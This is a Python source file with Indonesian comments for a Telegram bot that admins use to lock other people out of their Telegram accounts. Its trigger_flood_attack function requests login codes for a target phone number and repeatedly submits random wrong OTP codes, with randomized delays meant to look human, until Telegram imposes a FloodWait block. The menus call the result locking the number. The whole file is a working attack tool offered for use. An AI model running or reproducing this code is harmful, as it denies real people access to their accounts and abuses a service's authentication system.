import asyncio
import json
import logging
import re
import time
import random
from datetime import datetime, timedelta
from pathlib import Path

from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError, 
    PhoneNumberFloodError, 
    PhoneNumberInvalidError, 
    ApiIdInvalidError,
    SendCodeUnavailableError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError
)
from telethon.sessions import StringSession

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters

# Konfigurasi Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# State Global
CONFIG = {}
ACTIVE_FLOODS = {}      # Format: {"+628123456": timestamp_until}
PROCESSING_FLOODS = set() # PERBAIKAN 2: Mencegah double-click (Race Condition)

FLOOD_ATTACK_MAX_ATTEMPTS = 50
PHONE_REGEX = re.compile(r"^\+\d{7,15}$")

def load_config():
    path = Path("config.json")
    if not path.exists():
        logger.error("config.json tidak ditemukan!")
        exit(1)
    with open(path, "r") as f:
        return json.load(f)

def normalize_phone(raw: str) -> str:
    digits = re.sub(r"\D", "", raw)
    return "+" + digits

def format_duration(seconds: int) -> str:
    if seconds <= 0: return "0s"
    d, rem = divmod(seconds, 86400)
    h, rem = divmod(rem, 3600)
    m, s = divmod(rem, 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    if s and not parts: parts.append(f"{s}s")
    return " ".join(parts) if parts else "0s"

def get_flood_remaining(phone: str) -> int:
    until = ACTIVE_FLOODS.get(phone)
    if not until: return 0
    remaining = int(until - time.monotonic())
    if remaining <= 0:
        ACTIVE_FLOODS.pop(phone, None) # PERBAIKAN 3: Auto-cleanup memory
        return 0
    return remaining

def is_authorized(user_id: int) -> bool:
    return user_id in CONFIG.get("admin_ids", [])

async def trigger_flood_attack(phone: str) -> tuple:
    """Return (seconds, attempts, success, reason)"""
    client = TelegramClient(StringSession(), CONFIG["api_id"], CONFIG["api_hash"])
    attempts = 0
    phone_code_hash = None
    
    try:
        await client.connect()
        
        for _ in range(FLOOD_ATTACK_MAX_ATTEMPTS):
            # 1. Jika belum punya hash, minta OTP dulu
            if not phone_code_hash:
                try:
                    sent_code = await client.send_code_request(phone)
                    phone_code_hash = sent_code.phone_code_hash
                except FloodWaitError as e:
                    ACTIVE_FLOODS[phone] = time.monotonic() + e.seconds
                    return e.seconds, attempts, True, "FloodWait terpicu saat meminta kode"
                except Exception as e:
                    return 0, attempts, False, f"Gagal meminta kode: {str(e)}"

            # 2. Tebak kode yang salah
            wrong_code = str(random.randint(10000, 99999))
            attempts += 1
            
            try:
                # Mencoba sign-in dengan kode yang salah
                await client.sign_in(phone=phone, code=wrong_code, phone_code_hash=phone_code_hash)
                
                # Jika berhasil (sangat langka), langsung logout untuk keamanan
                await client.log_out()
                return 0, attempts, True, "Berhasil login dengan tebakan (sudah dilogout)"
                
            except PhoneCodeInvalidError:
                # Kode salah, lanjut tembak lagi
                logger.info(f"Percobaan {attempts}: Kode {wrong_code} salah. Melanjutkan...")
                
            except PhoneCodeExpiredError:
                # Terlalu banyak salah, hash hangus. Kita minta hash baru
                logger.info("Kode expired. Meminta hash baru...")
                phone_code_hash = None
                
            except FloodWaitError as e:
                # SUKSES BESAR! Telegram memblokir login karena terlalu banyak salah
                ACTIVE_FLOODS[phone] = time.monotonic() + e.seconds
                return e.seconds, attempts, True, "Berhasil memicu FloodWait"
                
            except SendCodeUnavailableError:
                return 0, attempts, False, "Semua metode pengiriman OTP habis."
                
            except Exception as e:
                logger.error(f"Error sign-in: {e}")
                phone_code_hash = None # Reset hash jika ada error aneh
                
            # PERBAIKAN 1: Jitter Delay (Jeda acak antara 1.2 sampai 2.5 detik)
            # Membuat pola tembakan terlihat seperti manusia, bukan robot.
            await asyncio.sleep(random.uniform(1.2, 2.5))
            
    finally:
        await client.disconnect()
        
    return 0, attempts, False, f"Gagal setelah {attempts}x percobaan."

# ================= UI & MENUS =================

def get_main_menu():
    keyboard = [
        [InlineKeyboardButton("🔥 Mulai FloodWait", callback_data="menu_flood")],
        [InlineKeyboardButton("⏳ Cek Status Aktif", callback_data="menu_status")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized")
        return

    context.user_data['awaiting_phone'] = False
    text = "🛡️ **FloodWait Control Panel**\n\nSilakan pilih menu di bawah ini:"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=get_main_menu())

# ================= CALLBACK HANDLER =================

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id

    if not is_authorized(user_id):
        await query.answer("⛔ Unauthorized", show_alert=True)
        return

    data = query.data

    if data == "main_menu":
        context.user_data['awaiting_phone'] = False
        await query.edit_message_text(
            "🛡️ **FloodWait Control Panel**\n\nSilakan pilih menu di bawah ini:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu()
        )

    elif data == "menu_flood":
        context.user_data['awaiting_phone'] = True
        await query.edit_message_text(
            "📱 **Silakan ketik nomor target**\n\n"
            "Contoh: `628123456789` atau `+628123456789`\n\n"
            "*Ketik /start untuk membatalkan*",
            parse_mode=ParseMode.MARKDOWN
        )

    elif data == "menu_status":
        context.user_data['awaiting_phone'] = False
        lines = ["⏳ **Nomor dalam FloodWait**\n"]
        any_flood = False
        for phone in list(ACTIVE_FLOODS.keys()):
            remaining = get_flood_remaining(phone)
            if remaining > 0:
                any_flood = True
                lines.append(f"• `{phone}` — {format_duration(remaining)}")
        
        if not any_flood:
            lines.append("✅ Tidak ada nomor yang terkunci.")
        
        keyboard = [[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]
        await query.edit_message_text(
            "\n".join(lines),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif data.startswith("confirm_flood_"):
        phone = data.replace("confirm_flood_", "")
        
        # PERBAIKAN 2: Cek apakah nomor ini sedang diproses
        if phone in PROCESSING_FLOODS:
            await query.answer("⏳ Proses untuk nomor ini sedang berjalan. Mohon tunggu!", show_alert=True)
            return
            
        PROCESSING_FLOODS.add(phone)
        
        try:
            await query.answer("Memulai proses tebak OTP...")
            
            await query.edit_message_text(
                f"🔥 **Memproses {phone}...**\n\n"
                f"Bot sedang menebak kode OTP secara acak untuk memicu pemblokiran. Mohon tunggu...",
                parse_mode=ParseMode.MARKDOWN
            )

            seconds, attempts, success, reason = await trigger_flood_attack(phone)

            if success:
                until_utc = (datetime.utcnow() + timedelta(seconds=seconds)).strftime("%H:%M UTC")
                text = (
                    f"✅ **Nomor Berhasil Dikunci**\n\n"
                    f"Nomor: `{phone}`\n"
                    f"Durasi: **{format_duration(seconds)}** (Sampai {until_utc})\n"
                    f"Percobaan Salah: {attempts}x\n"
                    f"Status: _{reason}_\n\n"
                    f"🛡️ Tidak ada OTP yang bisa digunakan untuk login selama periode tersebut."
                )
            else:
                text = (
                    f"⚠️ **Proses Tidak Berhasil**\n\n"
                    f"Nomor: `{phone}`\n"
                    f"Percobaan: {attempts}x\n"
                    f"Alasan: **{reason}**"
                )

            keyboard = [[InlineKeyboardButton("🔙 Menu Utama", callback_data="main_menu")]]
            await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
            
        finally:
            # Hapus dari antrean setelah selesai atau error
            PROCESSING_FLOODS.discard(phone)

    elif data == "cancel_flood":
        context.user_data['awaiting_phone'] = False
        await query.answer("Dibatalkan")
        await query.edit_message_text(
            "❌ Dibatalkan. Kembali ke menu utama.",
            reply_markup=get_main_menu()
        )

# ================= MESSAGE HANDLER (INPUT NOMOR) =================

async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_phone'):
        return

    if not is_authorized(update.effective_user.id):
        return

    raw_phone = update.message.text.strip()
    phone = normalize_phone(raw_phone)

    if not PHONE_REGEX.match(phone):
        await update.message.reply_text(
            f"❌ Format salah: `{raw_phone}`\n"
            f"Gunakan format: `628123456789`\n\n"
            f"Ketik /start untuk membatalkan.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    remaining = get_flood_remaining(phone)
    if remaining > 0:
        await update.message.reply_text(
            f"⏳ Nomor `{phone}` sudah terkunci.\nSisa waktu: **{format_duration(remaining)}**", 
            parse_mode=ParseMode.MARKDOWN
        )
        context.user_data['awaiting_phone'] = False
        return

    context.user_data['awaiting_phone'] = False
    
    keyboard = [
        [InlineKeyboardButton("✅ Ya, Lock Nomor", callback_data=f"confirm_flood_{phone}")],
        [InlineKeyboardButton("❌ Batal", callback_data="cancel_flood")]
    ]
    
    await update.message.reply_text(
        f"🔥 **Konfirmasi FloodWait**\n\n"
        f"Target: `{phone}`\n\n"
        f"Bot akan menebak kode OTP yang salah secara berulang sampai Telegram memblokir nomor ini.\n"
        f"Efek: Siapa pun (termasuk Anda) tidak akan bisa login menggunakan nomor ini untuk sementara waktu.\n\n"
        f"Lanjutkan?",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ================= MAIN =================

def main():
    global CONFIG
    CONFIG = load_config()

    logger.info("Memulai FloodWait Bot...")
    app = Application.builder().token(CONFIG["bot_token"]).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_input))

    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()